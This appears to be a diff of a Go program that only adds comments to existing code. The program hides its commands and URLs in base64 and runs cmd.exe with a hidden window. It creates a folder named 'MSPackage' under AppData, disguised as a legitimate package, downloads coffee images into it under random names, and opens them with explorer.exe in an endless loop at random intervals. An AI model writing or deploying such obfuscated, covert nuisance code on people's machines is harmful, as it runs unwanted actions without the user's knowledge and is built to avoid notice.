@@ -15,12 +15,14 @@ import (
   "syscall"
 )
 
+// converts string into bytes and encodes with base64
 func encodeBase64(encodeTo64 string) string {
   encodeString := base64.StdEncoding.EncodeToString([]byte(encodeTo64))
   returnStr := string(encodeString)
   return returnStr
 }
 
+// takes an exe that needs to run through cmd, along with a string containing the path
 func runExe(ap string, path string) string {
   decodeAp := decodeBase64(ap)
   decodePath := decodeBase64(path)
@@ -28,20 +30,20 @@ func runExe(ap string, path string) string {
   rStringPath := string(decodePath)
   exeCmd := exec.Command("cmd.exe", "/C", rStringAp, rStringPath)
   exeCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-
+  
   exeCmd.Stdin = strings.NewReader("")
   var output bytes.Buffer
   exeCmd.Stdout = &output
-
-
+  // Go needs to know how it can throw an error, otherwise it wont let you compile
   err := exeCmd.Run()
   if err != nil {
-  //  log.Fatal(err)
+  // continue
   }
 
   return output.String()
 }
 
+// decodes a string from base64 to english
 func decodeBase64(textToDecode string) []byte {
   stringDecode, err := base64.StdEncoding.DecodeString(textToDecode)
   if err != nil{
@@ -50,6 +52,8 @@ func decodeBase64(textToDecode string) []byte {
   return stringDecode
 }
 
+// downloads the file, takes in the path you want to save it to
+// as well as the url you want to download it from
 func DownloadFile(filepath string, url string) error {
 
   // waits for thr GET repsonse
@@ -71,6 +75,8 @@ func DownloadFile(filepath string, url string) error {
   return err
 }
 
+// decodes env variable from base64 to english and returns output
+// of the executed command
 func getEnv(value string) string {
   decodeString := decodeBase64(value)
   result := string(decodeString)
@@ -78,6 +84,7 @@ func getEnv(value string) string {
   return cmdResult
 }
 
+// executes commands that only require cmd to execute
 func executeCommand(cmd string) string {
   decodeString := decodeBase64(cmd)
   rString := string(decodeString)
@@ -88,15 +95,16 @@ func executeCommand(cmd string) string {
   var output bytes.Buffer
   exeCmd.Stdout = &output
 
-
   err := exeCmd.Run()
   if err != nil {
-  //  log.Fatal(err)
+  // continue
   }
 
   return output.String()
 }
 
+// generates random character strings, adds a .extension on the end of each and put them into an array
+// used to rename downloaded files with random character strings
 func generateRandomString(chars int, numberOfStrings int, imgExtension string) []string{
 
   randomChar := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
@@ -119,12 +127,14 @@ func generateRandomString(chars int, numberOfStrings int, imgExtension string) [
   return outputArr
 }
 
+// creates a 1 second delay
 func timeOut(){
   time.Sleep(1*time.Second)
 }
 
 func main(){
-
+  
+  // raw string literal holding multiple urls
   urls := `
   aHR0cHM6Ly9jZG4ucGl4YWJheS5jb20vcGhvdG8vMjAxNy8wNS8xMi8wOC8yOS9jb2ZmZWUtMjMwNjQ3MV85NjBfNzIwLmpwZw==
   aHR0cHM6Ly9jZG4ucGl4YWJheS5jb20vcGhvdG8vMjAxNi8wMy8yNi8xMy8wOS9jdXAtb2YtY29mZmVlLTEyODA1MzdfOTYwXzcyMC5qcGc=
@@ -150,13 +160,14 @@ func main(){
     fmt.Println(genRandomNames[index])
       storeRandomNames = append(storeRandomNames, genRandomNames[index])
   }
-
+  // makes a folder to store files in
   makeFolder := executeCommand("bWQgJWFwcGRhdGElXE1TUGFja2FnZQ==")
   timeOut()
   getPath := getEnv("YXBwZGF0YQ==")
   folderName := decodeBase64("TVNQYWNrYWdl")
   tempPath := ""
 
+  // builds the folder path, and downloads the files
   fmt.Println(makeFolder)
   for index := 0; index < len(urlLinks); index ++ {
     decodeUrl := decodeBase64(urlLinks[index])
@@ -167,7 +178,8 @@ func main(){
     tempPath = ""
     fmt.Println(writeToDisk)
   }
-
+  
+  // creates an endless loop and opens files from 0 seconds to 3 minutes
   ex := "ZXhwbG9yZXIuZXhl"
   flag := true
   for flag != false {
